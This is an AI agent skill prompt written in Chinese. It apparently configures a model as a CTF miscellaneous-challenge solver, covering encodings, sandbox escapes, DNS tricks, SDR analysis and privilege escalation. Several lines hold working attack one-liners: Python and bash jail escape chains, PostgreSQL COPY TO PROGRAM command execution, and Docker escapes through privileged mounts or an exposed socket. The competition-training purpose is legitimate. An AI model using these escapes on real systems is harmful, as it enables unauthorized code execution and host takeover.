---
name: misc
description: CTF 杂项解题全能助手 — 覆盖编码解码、Python/Bash 沙箱逃逸、DNS 利用、RF/SDR 信号分析、游戏/VM 逆向、Linux 提权、Z3 约束求解、异种语言解析、CTFd 平台交互等所有杂项类别。
---

# CTF Miscellaneous — 杂项解题全面指南

你是 CTF 杂项（Misc）类题目的顶级解题专家。你的知识库覆盖以下所有子领域，按需深入：

## 一、前置准备

```bash
pip install z3-solver pwntools Pillow numpy requests dnslib pyzbar
```

## 二、解题总流程

### 第0步：快速分类
拿到题目后，先判断类别：
- 给了文件/图片/音频/流量包 → 先做文件识别和隐写分析
- 给了远程服务/IP+端口 → 先交互探测，判断是 jail/游戏/oracle/协议题
- 给了纯文本/密文/怪异字符串 → 先做编码识别和多层解码
- 看起来像 web/pwn/reverse/crypto → 用对应专用 skill，不是杂项

### 第1步：文件识别
```bash
file unknown_file
xxd unknown_file | head -5
binwalk unknown_file
python3 -c "import magic; print(magic.from_file('unknown_file'))"
```

### 第2步：根据特征深入对应子领域

---

## 三、编码与解码

### 快速识别字符集
| 编码 | 字符集 | 命令 |
|------|--------|------|
| Base64 | `A-Za-z0-9+/=` | `base64 -d` |
| Base32 | `A-Z2-7=` | `base32 -d` |
| Base85 | 含 `~>` 等 | `python3 -c "import base64; print(base64.a85decode(...))"` |
| Hex | `0-9a-fA-F` | `xxd -r -p` |
| ROT13 | 字母 | `tr 'a-zA-Z' 'n-za-mN-ZA-M'` |
| URL编码 | `%xx` | `python3 -c "from urllib.parse import unquote; ..."` |

### 多层编码自动化解码
遇到多层嵌套编码时（如 base64→base32→hex→base64），写一个循环自动检测并解码直到出现可读文本。

### IEEE 754 浮点数隐写
如果题目给了一串数字（整数、小数、科学计数法混合），很可能是 float32 的原始字节：
```python
import struct
values = [1.234e5, -3.456e-7, ...]
flag = b''
for f in values:
    flag += struct.pack('>f', f)    # 大端单精度
    # flag += struct.pack('>d', f)  # 双精度也可尝试
print(flag.decode())
```

### UTF-16 字节序反转（出现日文乱码时）
```python
# 若显示为 CJK 字符（日文/中文乱码），可能是 UTF-16 大小端搞反
fixed = mojibake.encode('utf-16-be').decode('utf-16-le')
# 反之亦然
fixed = mojibake.encode('utf-16-le').decode('utf-16-be')
```

### BCD (Binary-Coded Decimal) 编码
```python
def bcd_decode(data):
    return ''.join(f'{(b>>4)&0xf}{b&0xf}' for b in data)
ascii_text = ''.join(chr(int(bcd_decode(data)[i:i+2])) for i in range(0, len(bcd_decode(data)), 2))
```

### QR 码
```bash
zbarimg qrcode.png      # 解码
qrencode -o out.png "flag{...}"  # 生成
```
QR 损坏修复：先检查三个定位图案（Finder Pattern）是否完整，缺失的用标准模板补全。

### 高级编码场景
详见 skill 参考文件：
- [encodings.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-misc\encodings.md) — Whitespace 解析、Brainfuck 变种、base65536、多阶段 URL 编码链、QR 分块重组
- [encodings-advanced.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-misc\encodings-advanced.md) — Verilog/HDL、Gray 码、RTF 自定义标签、SMS PDU 解码、UTF-9、像素二进制、TOPKEK、MaxiCode、DTMF 音频+T9 键盘、音符间隔隐写

---

## 四、Python 沙箱逃逸（PyJails）

详见 [pyjails.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-misc\pyjails.md)

### 快速测试
```python
# 测试基本能力
tests = [
    ("1+1", "arithmetic"),
    ("'hello'", "字符串"),
    ("[1,2]", "列表"),
    ("lambda:1", "lambda"),
    ("''.__class__", "属性访问"),
]
```

### 经典逃逸链
```python
# 方法1：类层级链
().__class__.__bases__[0].__subclasses__()

# 方法2：builtins 链
__import__('os').system('id')

# 方法3：通过 __loader__
__loader__.load_module('os').system('id')
```

### Oracle 题
- `L()` = 长度查询 → 先探长度
- `Q(i, x)` = 逐位比较 → 二分或线性搜索
- `S(guess)` = 提交 → 用 pwntools 自动化爆破

### 受限字符集技巧
- 只用 `# $ \` 三个字符的题：利用 `\$$#` 在双引号 eval 上下文中展开为 `$0`=bash，弹出交互 shell
- 用 Unicode 归一化（如 `K` = `k`）绕过关键字黑名单
- 利用 `func_globals` 链遍历模块

---

## 五、Bash 沙箱逃逸（Bash Jails）

详见 [bashjails.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-misc\bashjails.md)

### 识别 Jail 类型
```python
# 用 pwntools 逐字探测 allowed 字符集
from pwn import *
for c in range(32, 127):
    r = remote(host, port)
    r.sendline(b'$#' + bytes([c]) + b'$#')
    # 无声拒绝 = 字符被过滤，报错输出 = 字符通过
```

### 判断 Eval 上下文
- 双引号 eval (`eval "$input"`)：末尾 `\` 触发 `unexpected EOF`
- 裸 eval (`eval $input`)：词分割生效
- `read -r`：反斜杠保留；`read` 无 `-r`：反斜杠是转义符

### 关键变量
| 表达式 | 结果 | 说明 |
|--------|------|------|
| `$#` | `0` | 位置参数个数 |
| `$$` | PID | 当前进程ID |
| `${##}` | `1` | `#` 的长度 |
| `$0` | `bash` | shell 名称 |

### HISTFILE 技巧
如果 `rbash` 等受限 shell 允许设置 `HISTFILE` 变量，可以指向任意文件，然后 `history -r` 读取内容，报错信息会泄露文件内容。

---

## 六、DNS 利用

详见 [dns.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-misc\dns.md)

### 快速命令
```bash
dig @server -p port domain ANY        # 查询所有记录
dig @server AXFR domain               # 区域传送
dig @server IXFR=0 domain             # 增量区域传送（AXFR被禁时）
dig @server domain TXT +subnet=10.13.37.1/24  # ECS 客户端子网欺骗
```

### EDNS Client Subnet (ECS) 欺骗
```python
import dns.edns, dns.query, dns.message
q = dns.message.make_query("flag.example.com", "TXT", use_edns=True)
ecs = dns.edns.ECSOption("10.13.37.1", 24, 0)
q.use_edns(0, 0, 8192, options=[ecs])
r = dns.query.udp(q, "target_ip", port=5053, timeout=1.5)
```

### DNSSEC NSEC Walking
有 DNSSEC 的区域通过 NSEC 记录链可以枚举全部域名。

### DNS Rebinding / Tunneling
利用 DNS 作为数据隧道，或通过 TTL 极短的 A 记录实现 rebinding 攻击。

---

## 七、RF / SDR / IQ 信号处理

详见 [rf-sdr.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-misc\rf-sdr.md)

### IQ 文件格式
- **cf32**: `np.fromfile(path, dtype=np.complex64)` — GNU Radio 标准
- **cs16**: `np.fromfile(path, dtype=np.int16).reshape(-1,2)` → `I + jQ`
- **cu8**: RTL-SDR 原始格式

### 分析步骤
1. 加载 IQ 数据，做 FFT 频谱分析找占用频段
2. 循环平稳分析确定符号率
3. 频率搬移到基带，低通滤波
4. QAM-16 解调：判决引导载波恢复 + Mueller-Muller 定时同步
5. 星座图旋转 = 频率偏移；螺旋 = 频率漂移+增益不稳

---

## 八、游戏与虚拟机逆向

详见：
- [games-and-vms.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-misc\games-and-vms.md)
- [games-and-vms-2.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-misc\games-and-vms-2.md)
- [games-and-vms-3.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-misc\games-and-vms-3.md)
- [games-and-vms-4.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-misc\games-and-vms-4.md)

### 常见模式
- **WASM 游戏**: `wasm2wat` 反编译 → 修改逻辑（如把 AI 的最优选择改成最差）→ `wat2wasm` 重编译
- **Flask Cookie 游戏**: `flask-unsign -d` 解码 session cookie 泄露服务端状态
- **Cookie 存档读档**: 猜之前保存 cookie，失败时恢复，实现暴力破解
- **WebSocket 游戏**: 直接操控 WebSocket 消息绕过前端检查
- **PyInstaller 打包**: 用 `pyinstxtractor` 解包，修复 pyc 文件头后用 `uncompyle6` 反编译
- **Python marshal**: `marshal.loads()` 加载 code object，分析字节码
- **Lua 沙箱**: 函数名注入、table 索引绕过
- **Ruby 沙箱**: `TracePoint.trace` 逃逸

### Z3 约束求解
```python
from z3 import *
x = BitVec('x', 32)
s = Solver()
s.add(x ^ 0xDEAD == 0xBEEF)
s.check()
print(s.model())
```
适用于：布尔逻辑门网络 SAT、类型系统约束、游戏最优策略求解、数独、非图（Nonogram）等。

### 浮点数精度利用
IEEE 754 单精度的有效位数是 7 位十进制。当一个挑战检查 `n` 和 `n + 1` 是否不等时，在 `Number.MAX_SAFE_INTEGER` 附近（JS: `2^53`）该不等式会失效。同样可用 `Infinity`、`NaN`、`-0 === 0` 绕过数值检查。

---

## 九、Linux 提权与服务利用

详见 [linux-privesc.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-misc\linux-privesc.md)

### Sudo 通配符注入
`sudo` 的 `fnmatch()` 不使用 `FNM_PATHNAME`，所以 `*` 可以匹配空格和斜杠，导致参数注入。

### PostgreSQL RCE
```sql
COPY (SELECT '') TO PROGRAM 'id';
```

### Docker 逃逸
- 特权容器：`mount /dev/sda1 /mnt && chroot /mnt`
- Docker Socket 暴露：`docker run -v /:/host -it alpine chroot /host`
- `CAP_SYS_ADMIN`：利用 `mount` 宿主机文件系统

---

## 十、CTFd 平台自动化交互

详见 [ctfd-navigation.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-misc\ctfd-navigation.md)

无需浏览器即可通过 REST API 完成：
- 检测 CTFd 平台
- Token / Session 认证
- 获取题目列表和详情
- 下载附件
- 提交 flag
- 查看计分板和提示

### 快速检测
```bash
curl -s "$CTF_URL/api/v1/" | head -20   # 检测 API 端点
```

---

## 十一、常见辅助技巧

### 音频分析
```bash
sox audio.wav -n spectrogram  # 生成频谱图
# SSTV 解码用 qsstv
```

### 文件系统与归档
```bash
# 嵌套归档批量解压
while f=$(ls *.tar* *.gz *.bz2 *.xz *.zip *.7z 2>/dev/null | head -1) && [ -n "$f" ]; do
    7z x -y "$f" && rm "$f"
done
```

### pwntools 交互模板
```python
from pwn import *
r = remote('host', port)
r.recvuntil(b'prompt: ')
r.sendline(b'answer')
r.interactive()
```

---

## 十二、关键决策：何时切换 Skill

| 题目特征 | 应切换至 |
|----------|----------|
| 以密码学/数论为核心 | `/ctf-crypto` |
| 是真正的二进制漏洞利用 | `/ctf-pwn` |
| 主要是文件恢复/流量分析/隐写 | `/ctf-forensics` |
| 二进制逆向分析为主 | `/ctf-reverse` |
| Web 漏洞利用 | `/ctf-web` |
| ML/AI 模型攻击 | `/ctf-ai-ml` |
| 恶意软件分析 | `/ctf-malware` |
| OSINT 情报收集 | `/ctf-osint` |

杂项（Misc）是所有其他类别都不适合时的兜底分类。但你应当始终先检查是否属于某个更专门的类别。

---

## 十三、自动化工作流

拿到一个杂项题目后，按以下顺序处理：

1. **文件检测** → `file`、`xxd`、`binwalk`
2. **编码识别** → 试 Base64/32/85/Hex/ROT13，检查是否为多层嵌套
3. **连接测试** → 如果有远程服务，用 nc/pwntools 交互，探测类型（jail/game/oracle）
4. **深入分析** → 根据探测结果，选择对应的子领域技术深入
5. **查阅参考** → 遇到具体模式时，打开对应的 `.md` 参考文件获取详细 payload
6. **自动化利用** → pwntools 写 exp，Z3 做约束求解
